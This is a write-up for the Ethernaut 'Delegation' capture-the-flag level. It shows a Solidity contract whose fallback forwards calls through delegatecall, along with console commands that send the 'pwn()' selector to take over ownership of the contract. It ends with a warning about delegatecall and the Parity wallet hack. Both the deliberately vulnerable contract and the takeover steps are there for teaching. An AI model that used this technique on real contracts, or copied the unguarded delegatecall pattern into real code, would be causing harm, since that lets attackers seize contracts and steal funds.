![](https://ethernaut.openzeppelin.com/imgs/BigLevel6.svg)

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

## Solution

We’ll do this soution through the Ethernaut console (F-12).

1. First let’s check the value of `owner` by typing `await contract.owner()`
2. Now we’ll need to get the function signature of `pwn()` to pass into `msg.data` since that’s what the `delegatecall` is actually calling. We can do this through the following command: `pwnSignature = web3.utils.keccak256("pwn()")`
3. Now that we’ve got the function signature of `pwn()` we can include it in a transaction: `await contract.sendTransaction({data: pwnSignature})`
4. Now we can check to see if the `owner` has been updated.

___
Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.